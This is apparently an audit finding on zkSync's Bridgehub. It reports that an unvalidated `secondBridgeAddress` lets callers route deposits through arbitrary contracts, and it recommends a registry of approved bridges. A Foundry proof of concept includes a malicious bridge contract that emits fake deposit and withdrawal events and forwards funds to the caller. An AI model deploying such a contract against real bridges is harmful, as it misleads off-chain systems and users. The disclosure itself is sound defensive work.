# Calling arbitrary contracts without any restrictions poses significant risks to the system

In `requestL2TransactionTwoBridges()`, users can provide the `secondBridgeAddress`, which is then used [in this line](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol#L288) to make a deposit on L1:
```
        L2TransactionRequestTwoBridgesInner memory outputRequest = IL1SharedBridge(_request.secondBridgeAddress)
            .bridgehubDeposit{value: _request.secondBridgeValue}(
            _request.chainId,
            msg.sender,
            _request.l2Value,
            _request.secondBridgeCalldata
        );
```

Since `secondBridgeAddress` can be any address without any validation, this may pose significant risks to the system. One possible scenario demonstrating the necessity to mitigate this risk is that a malicious actor is able to emit hundreds of incorrect logs by providing the address to a malicious contract and spamming the off-chain systems.

## Coded PoC
In this test code, an attacker provides the address of a malicious contract that emits some events that are not related to this function, which is a deposit.
To test the scenario, please make a file named `ninja.t.sol` in `/test/foundry/unit/concrete/BridgeHub/` and paste the following code in it.
```
//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.20;

import {stdStorage, StdStorage, Test} from "forge-std/Test.sol";

import {Diamond} from "solpp/state-transition/libraries/Diamond.sol";
import {TestnetERC20Token} from "solpp/dev-contracts/TestnetERC20Token.sol";
import {IBridgehub, Bridgehub} from "solpp/bridgehub/Bridgehub.sol";
import {L2TransactionRequestDirect, L2TransactionRequestTwoBridgesOuter} from "solpp/bridgehub/IBridgehub.sol";
import {DummyStateTransitionManagerWBH} from "solpp/dev-contracts/test/DummyStateTransitionManagerWithBridgeHubAddress.sol";
import {DummyStateTransition} from "solpp/dev-contracts/test/DummyStateTransition.sol";
import {DummySharedBridge} from "solpp/dev-contracts/test/DummySharedBridge.sol";
import {MaliciousSharedBridge} from "./MaliciousSharedBridge.sol";
import {IL1SharedBridge} from "solpp/bridge/interfaces/IL1SharedBridge.sol";
import {TransactionValidator} from "solpp/state-transition/libraries/TransactionValidator.sol";

import {L2Message, L2Log, TxStatus, BridgehubL2TransactionRequest} from "solpp/common/Messaging.sol";
import {ETH_TOKEN_ADDRESS, REQUIRED_L2_GAS_PRICE_PER_PUBDATA, MAX_NEW_FACTORY_DEPS} from "solpp/common/Config.sol";

contract ExperimentalBridgeTest is Test {
    using stdStorage for StdStorage;

    Bridgehub bridgeHub;
    address public bridgeOwner;
    DummyStateTransitionManagerWBH mockSTM;
    DummyStateTransition mockChainContract;
    DummySharedBridge mockSharedBridge;
    MaliciousSharedBridge maliciousSharedBridge;
    TestnetERC20Token testToken;

    function setUp() public {
        bridgeHub = new Bridgehub();
        bridgeOwner = makeAddr("BRIDGE_OWNER");
        mockSTM = new DummyStateTransitionManagerWBH(address(bridgeHub));
        mockChainContract = new DummyStateTransition(address(bridgeHub));
        mockSharedBridge = new DummySharedBridge(keccak256("0xabc"));
        maliciousSharedBridge = new MaliciousSharedBridge();
        testToken = new TestnetERC20Token("ZKSTT", "ZkSync Test Token", 18);

        // test if the ownership of the bridgeHub is set correctly or not
        address defaultOwner = bridgeHub.owner();

        // The defaultOwner should be the same as this contract address, since this is the one deploying the bridgehub contract
        assertEq(defaultOwner, address(this));

        // Now, the `reentrancyGuardInitializer` should prevent anyone from calling `initialize` since we have called the constructor of the contract
        vm.expectRevert(bytes("1B"));
        bridgeHub.initialize(bridgeOwner);

        vm.store(
            address(mockChainContract),
            0x8e94fed44239eb2314ab7a406345e6c5a8f0ccedf3b600de3d004e672c33abf4,
            bytes32(uint256(1))
        );
        bytes32 bridgehubLocation = bytes32(uint256(36));
        vm.store(address(mockChainContract), bridgehubLocation, bytes32(uint256(uint160(address(bridgeHub)))));
        bytes32 baseTokenGasPriceNominatorLocation = bytes32(uint256(40));
        vm.store(address(mockChainContract), baseTokenGasPriceNominatorLocation, bytes32(uint256(1)));
        bytes32 baseTokenGasPriceDenominatorLocation = bytes32(uint256(41));
        vm.store(address(mockChainContract), baseTokenGasPriceDenominatorLocation, bytes32(uint256(1)));
        // The ownership can only be transfered by the current owner to a new owner via the two-step approach

        // Default owner calls transferOwnership
        bridgeHub.transferOwnership(bridgeOwner);

        // bridgeOwner calls acceptOwnership
        vm.prank(bridgeOwner);
        bridgeHub.acceptOwnership();

        // Ownership should have changed
        assertEq(bridgeHub.owner(), bridgeOwner);
    }

    function test_MaliciousEvents() public {
        L2TransactionRequestTwoBridgesOuter memory l2TxnReq2BridgeOut = _createMockL2TransactionRequestTwoBridgesOuter();

        l2TxnReq2BridgeOut.chainId = _setUpStateTransitionForChainId(l2TxnReq2BridgeOut.chainId);

        _setUpBaseTokenForChainId(l2TxnReq2BridgeOut.chainId, true);
        assertTrue(bridgeHub.baseToken(l2TxnReq2BridgeOut.chainId) == ETH_TOKEN_ADDRESS);

        _setUpSharedBridge();
        assertTrue(bridgeHub.getStateTransition(l2TxnReq2BridgeOut.chainId) == address(mockChainContract));

        uint256 callerMsgValue = l2TxnReq2BridgeOut.mintValue + l2TxnReq2BridgeOut.secondBridgeValue;
        address randomCaller = makeAddr("RANDOM_CALLER");
        vm.deal(randomCaller, callerMsgValue);

        mockChainContract.setBridgeHubAddress(address(bridgeHub));

        bytes32 canonicalHash = keccak256(abi.encode("CANONICAL_TX_HASH"));

        vm.mockCall(
            address(mockChainContract),
            abi.encodeWithSelector(mockChainContract.bridgehubRequestL2Transaction.selector),
            abi.encode(canonicalHash)
        );

        vm.prank(randomCaller);
        //bytes32 resultantHash =
        bridgeHub.requestL2TransactionTwoBridges{value: randomCaller.balance}(l2TxnReq2BridgeOut);

        assertTrue(true);
    }

    function _createMockL2TransactionRequestTwoBridgesOuter(
    ) internal view returns (L2TransactionRequestTwoBridgesOuter memory) {
        L2TransactionRequestTwoBridgesOuter memory l2Req;

        uint256 mintValue = 10e18;
        uint256 secondBridgeValue = 1e18;

        l2Req.chainId = 10;
        l2Req.mintValue = mintValue;
        l2Req.l2Value = 100;
        l2Req.l2GasLimit = 100;
        l2Req.l2GasPerPubdataByteLimit = 100;
        l2Req.refundRecipient = msg.sender;
        l2Req.secondBridgeAddress = address(maliciousSharedBridge);
        l2Req.secondBridgeValue = secondBridgeValue;
        l2Req.secondBridgeCalldata = new bytes(0);

        return l2Req;
    }

    function _setUpStateTransitionForChainId(uint256 mockChainId) internal returns (uint256) {
        vm.prank(bridgeOwner);
        bridgeHub.addStateTransitionManager(address(mockSTM));

        assertTrue(!(bridgeHub.stateTransitionManager(mockChainId) == address(mockSTM)));

        stdstore.target(address(bridgeHub)).sig("stateTransitionManager(uint256)").with_key(mockChainId).checked_write(
            address(mockSTM)
        );

        mockSTM.setStateTransition(mockChainId, address(mockChainContract));
        return mockChainId;
    }

    function _setUpBaseTokenForChainId(uint256 mockChainId, bool tokenIsETH) internal {
        address baseToken = tokenIsETH ? ETH_TOKEN_ADDRESS : address(testToken);

        stdstore.target(address(bridgeHub)).sig("baseToken(uint256)").with_key(mockChainId).checked_write(baseToken);
    }

    function _setUpSharedBridge() internal {
        vm.prank(bridgeOwner);
        bridgeHub.setSharedBridge(address(mockSharedBridge));
    }
}
```

Also make another file in the current path (beside ninja.t.sol) named: `MaliciousSharedBridge.sol` and paste the following code in it
```
pragma solidity 0.8.20;

// SPDX-License-Identifier: MIT

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {L2TransactionRequestTwoBridgesInner, L2TransactionRequestDirect} from "../../../../../contracts/bridgehub/IBridgehub.sol";

contract MaliciousSharedBridge {

    constructor(){}

    event BridgehubDepositBaseTokenInitiated(
        uint256 indexed chainId,
        address indexed from,
        address l1Token,
        uint256 amount
    );
    event ClaimedFailedDepositSharedBridge(
        uint256 indexed chainId,
        address indexed to,
        address indexed l1Token,
        uint256 amount
    );
    event WithdrawalFinalizedSharedBridge(
        uint256 indexed chainId,
        address indexed to,
        address indexed l1Token,
        uint256 amount
    );

    function bridgehubDeposit(
        uint256, //_chainId,
        address, //_prevMsgSender,
        uint256, // l2Value, needed for Weth deposits in the future
        bytes calldata
    ) external payable returns (L2TransactionRequestTwoBridgesInner memory request) {
        // Request the finalization of the deposit on the L2 side
        bytes memory l2TxCalldata = bytes("0xabcd123");
        bytes32 txDataHash = bytes32("0x1212121212abf");

        address l1Token = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

        uint256 amount = address(this).balance;
        address sender = tx.origin;

        bool callSuccess;
        // Transfering funds to attacker
        assembly {
            callSuccess := call(gas(), sender, amount, 0, 0, 0, 0)
        }
        require(callSuccess, "Transfer Failed");

        // Incorrect Events
        emit BridgehubDepositBaseTokenInitiated(2, sender, l1Token, 100e18);
        emit ClaimedFailedDepositSharedBridge(2, sender, l1Token, 100e18);
        emit WithdrawalFinalizedSharedBridge(2, sender, l1Token, 100e18);

        request = L2TransactionRequestTwoBridgesInner({
            magicValue: bytes32(uint256(keccak256("TWO_BRIDGES_MAGIC_VALUE")) - 1),
            l2Contract: address(0xCAFE),
            l2Calldata: l2TxCalldata,
            factoryDeps: new bytes[](0),
            txDataHash: txDataHash
        });
    }

    function bridgehubConfirmL2Transaction(uint256 _chainId, bytes32 _txDataHash, bytes32 _txHash) external {}
}
```
Run the following command to test the scenario:
```
forge test --mt test_MaliciousEvents -vvvv
```
Outputs that shows incorrect emitted events:
```
    │   │   ├─ emit BridgehubDepositBaseTokenInitiated(chainId: 2, from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], l1Token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, amount: 100000000000000000000 [1e20])
    │   │   ├─ emit ClaimedFailedDepositSharedBridge(chainId: 2, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], l1Token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, amount: 100000000000000000000 [1e20])
    │   │   ├─ emit WithdrawalFinalizedSharedBridge(chainId: 2, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], l1Token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, amount: 100000000000000000000 [1e20])
```

## Recommended Mitigation Steps
To mitigate the risk of calling arbitrary contracts, define a mapping of registered `L1SharedBridges` and check whether the user-provided `secondSharedBridge` is registered as a valid `L1SharedBridge` or not.